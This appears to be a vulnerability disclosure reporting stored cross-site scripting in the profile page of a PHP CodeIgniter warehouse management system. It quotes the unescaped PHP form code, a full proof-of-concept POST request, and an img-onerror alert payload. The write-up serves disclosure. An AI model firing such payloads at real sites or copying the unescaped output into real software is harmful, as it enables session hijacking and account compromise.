Warehouse Management System Store XSS on pengguna.php

```
/ci_wms/application/views/admin/content/pengaturan/pengguna.php
```

Vendor Homepage:

```
https://www.sourcecodester.com/php-codeigniter-warehouse-management-system-free-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/ci_wms/application/views/admin/content/pengaturan/pengguna.php
```

The potential risk of Cross-Site Scripting (XSS) arises because the values of the `$admin_user` and `$admin_nama` and`$admin_alamat`and`admin_telepon`variables are directly inserted into the `value` attribute of HTML input fields without undergoing HTML entity encoding. This means that if these variables contain malicious JavaScript code,  this code will be executed by the browser when the page loads.

```
                           <div class="form-group form-material">
                                <label class="control-label" for="inputText">Username</label>
                                <input type="text" value="<?php echo $admin_user; ?>" class="form-control input-sm" id="admin_user" name="admin_level_nama"
                                    placeholder="Enter Group" value="<?php echo $admin_user;?>" disabled required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Password</label>
                                <input type="password" class="form-control input-sm" id="admin_pass" name="admin_pass" placeholder="Enter New Password (if needed)"
                                />
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Full name</label>
                                <input type="text" value="<?php echo $admin_nama; ?>" class="form-control input-sm" id="admin_nama" name="admin_nama" placeholder="Full name"
                                    required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Address</label>
                                <input type="text" value="<?php echo $admin_alamat; ?>" class="form-control input-sm" id="admin_alamat" name="admin_alamat"
                                    placeholder="Address" required/>
                            </div>
                            <div class="form-group form-material">
                                <label class="control-label" for="inputText">Telephone</label>
                                <input type="text" value="<?php echo $admin_telepon; ?>" class="form-control input-sm" id="admin_telepon" name="admin_telepon"
                                    placeholder="Telephone" required/>
```

Proof of vulnerability:

Request:

```
POST /ci_wms/pengaturan/pengguna/edit/admin HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 225
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_wms/pengaturan/pengguna/edit/admin
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; sessions=jpl8k5bs8tuiji0nutsvbmga3f7msiag
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

admin_user=admin&admin_pass=admin123&admin_nama=M%22%3E%3Cimg+src%3D1+onerror%3Dalert%281%29%3E&admin_alamat=Here+St.+Over+There%2C+Anywhere%2C+2306&admin_telepon=9564897544&admin_level_kode=1&simpan=Update+Data
```

payload

```
"><img src=1 onerror=alert(1)>
```


<img width="1313" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/a3ae9313-6446-4315-838d-4a0681fd5ef5">
<img width="1268" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/cdf83903-8d97-4f5b-823c-23be73c4003b">
<img width="1265" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/fd74a2d1-ab0a-451a-a0e6-88b99e35bebc">
<img width="1339" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/3210964d-d5bd-4652-b8a2-cf631999fa58">





